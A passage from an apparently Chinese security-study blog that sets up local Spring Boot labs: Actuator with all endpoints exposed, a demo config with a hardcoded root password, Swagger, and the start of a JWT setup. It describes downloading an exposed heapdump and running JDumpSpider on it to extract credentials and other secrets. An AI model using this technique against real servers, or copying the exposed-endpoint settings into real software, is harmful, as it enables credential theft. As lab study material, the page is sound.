                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397412869000-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">// Server
</span></span><span class="line"><span class="cl">package com.example.testactuatorserver;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import de.codecentric.boot.admin.server.config.EnableAdminServer;
</span></span><span class="line"><span class="cl">import org.springframework.boot.SpringApplication;
</span></span><span class="line"><span class="cl">import org.springframework.boot.autoconfigure.SpringBootApplication;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@EnableAdminServer
</span></span><span class="line"><span class="cl">@SpringBootApplication
</span></span><span class="line"><span class="cl">public class TestActuatorServerApplication {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    public static void main(String[] args) {
</span></span><span class="line"><span class="cl">        SpringApplication.run(TestActuatorServerApplication.class, args);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397413785700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397413785700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397413785700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397413785700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397413785700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">server.port=8084</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><div class="code-block-container" id="code-1769750397413785700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397413785700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397413785700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397413785700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397413785700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">// Clinet
</span></span><span class="line"><span class="cl">server.port=8085
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">spring.boot.admin.client.url=http://127.0.0.1:8084
</span></span><span class="line"><span class="cl">management.endpoints.web.exposure.include=*
</span></span><span class="line"><span class="cl">management.endpoint.health.show-details=always</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902976.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901236.png" style="max-width: 100%; height: auto;"></p>
<p>访问<code>http://127.0.0.1:8085/actuator/heapdump</code></p>
<p>自动下载heapdump</p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900482.png" style="max-width: 100%; height: auto;"></p>
<h3 id="工具">工具<a hidden class="anchor" aria-hidden="true" href="#工具">#</a></h3>
<h4 id="jdumpspider">JDumpSpider<a hidden class="anchor" aria-hidden="true" href="#jdumpspider">#</a></h4>
<p><a href="https://github.com/whwlsfb/JDumpSpider">https://github.com/whwlsfb/JDumpSpider</a></p>
<p><code>java -jar .\target\JDumpSpider-1.1-SNAPSHOT-full.jar '&lt;heapfile&gt;'</code></p>
<h4 id="jvisualvm">jvisualvm<a hidden class="anchor" aria-hidden="true" href="#jvisualvm">#</a></h4>
<p>jdk1.8/bin/jvisualvm.exe</p>
<h3 id="安全问题">安全问题<a hidden class="anchor" aria-hidden="true" href="#安全问题">#</a></h3>
<p>参考：</p>
<p><a href="https://blog.csdn.net/god_zzZ/article/details/122837698">https://blog.csdn.net/god_zzZ/article/details/122837698</a></p>
<p><a href="https://blog.csdn.net/JHIII/article/details/126601858">https://blog.csdn.net/JHIII/article/details/126601858</a></p>
<p>分析提取出敏感信息（配置账号密码，接口信息，数据库，短信，云应用等）</p>
<p>提取到数据库信息</p>
<div class="code-block-container" id="code-1769750397414291300" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397414291300">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397414291300" title="Toggle" aria-expanded="false" aria-controls="code-1769750397414291300" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397414291300-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span><span class="lnt" id="7"><span class="lnlinks">7</span>
</span><span class="lnt" id="8"><span class="lnlinks">8</span>
</span><span class="lnt" id="9"><span class="lnlinks">9</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">server.port=8086
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">spring.datasource.url=jdbc:mysql://hocalhost:3306/demo01
</span></span><span class="line"><span class="cl">spring.datasource.name=root
</span></span><span class="line"><span class="cl">spring.datasource.password=123456
</span></span><span class="line"><span class="cl">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">management.endpoints.web.exposure.include=*
</span></span><span class="line"><span class="cl">management.endpoint.health.show-details=always</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901817.png" style="max-width: 100%; height: auto;"></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902873.png" style="max-width: 100%; height: auto;"></p>
<h2 id="接口系统-swagger">接口系统-Swagger<a hidden class="anchor" aria-hidden="true" href="#接口系统-swagger">#</a></h2>
<p>接口文档生成工具</p>
<p>参考文章：</p>
<p><a href="https://blog.csdn.net/lsqingfeng/article/details/123678701">https://blog.csdn.net/lsqingfeng/article/details/123678701</a></p>
<p>引入依赖包：</p>
<div class="code-block-container" id="code-1769750397414822400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397414822400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">xml</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397414822400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397414822400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397414822400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">// 2.9.2
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>io.springfox<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>springfox-swagger2<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.9.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>io.springfox<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>springfox-swagger-ui<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>2.9.2<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// 3.0.0
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>io.springfox<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>springfox-boot-starter<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>3.0.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>配置文件：</p>
<div class="code-block-container" id="code-1769750397415356400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397415356400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397415356400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397415356400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397415356400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span><span class="lnt" id="7"><span class="lnlinks">7</span>
</span><span class="lnt" id="8"><span class="lnlinks">8</span>
</span><span class="lnt" id="9"><span class="lnlinks">9</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">//  swagger2使用的开启注解是： @EnableSwagger2
</span></span><span class="line"><span class="cl">//  TestSwaggerDemoApplication.java
</span></span><span class="line"><span class="cl">@EnableSwagger2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">// application.properties
</span></span><span class="line"><span class="cl">server.port=8087
</span></span><span class="line"><span class="cl">spring.mvc.pathmatch.matching-strategy=ant_path_matcher
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//  在swagger3中，这个注解要换成： @EnableOpenApi</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>访问路径：</p>
<p>2.9.2：<a href="http://127.0.0.1:8087/swagger-ui.html">http://127.0.0.1:8087/swagger-ui.html</a></p>
<p>3.0.0:   <a href="http://127.0.0.1:8087/swagger-ui/index.html">http://127.0.0.1:8087/swagger-ui/index.html</a></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300900930.png" style="max-width: 100%; height: auto;"></p>
<div class="code-block-container" id="code-1769750397415356400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397415356400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397415356400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397415356400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397415356400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">package com.example.testswaggerdemo.demos.web;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import org.springframework.stereotype.Controller;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.GetMapping;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.PostMapping;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.RequestParam;
</span></span><span class="line"><span class="cl">import org.springframework.web.bind.annotation.ResponseBody;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@Controller
</span></span><span class="line"><span class="cl">public class TestController {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @GetMapping(&#34;/getdata&#34;)
</span></span><span class="line"><span class="cl">    @ResponseBody
</span></span><span class="line"><span class="cl">    public String getdata(@RequestParam String name) {
</span></span><span class="line"><span class="cl">        return &#34;get have data&#34; + name;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    @PostMapping(&#34;/postdata&#34;)
</span></span><span class="line"><span class="cl">    @ResponseBody
</span></span><span class="line"><span class="cl">    public String postdata(@RequestParam String name) {
</span></span><span class="line"><span class="cl">        return &#34;post have data&#34; + name;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300901493.png" style="max-width: 100%; height: auto;"></p>
<h3 id="安全问题-1">安全问题<a hidden class="anchor" aria-hidden="true" href="#安全问题-1">#</a></h3>
<p><strong>接口泄露</strong>：用户登录，信息显示，上传文件等</p>
<h2 id="身份鉴权-jwt">身份鉴权-JWT<a hidden class="anchor" aria-hidden="true" href="#身份鉴权-jwt">#</a></h2>
<p>参考：</p>
<p><a href="https://blog.csdn.net/Top_L398/article/details/109361680">https://blog.csdn.net/Top_L398/article/details/109361680</a></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202601300902904.png" style="max-width: 100%; height: auto;"></p>
<h4 id="1安装依赖">1、安装依赖<a hidden class="anchor" aria-hidden="true" href="#1安装依赖">#</a></h4>
<div class="code-block-container" id="code-1769750397415884100" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397415884100">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">xml</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397415884100" title="Toggle" aria-expanded="false" aria-controls="code-1769750397415884100" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397415884100-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span><span class="lnt" id="7"><span class="lnlinks">7</span>
</span><span class="lnt" id="8"><span class="lnlinks">8</span>
</span><span class="lnt" id="9"><span class="lnlinks">9</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- https://mvnrepository.com/artifact/com.auth0/java-jwt --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>com.auth0<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>java-jwt<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>3.18.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h4 id="2创建jwt">2、创建jwt<a hidden class="anchor" aria-hidden="true" href="#2创建jwt">#</a></h4>
<div class="code-block-container" id="code-1769750397416413400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397416413400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397416413400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397416413400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397416413400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
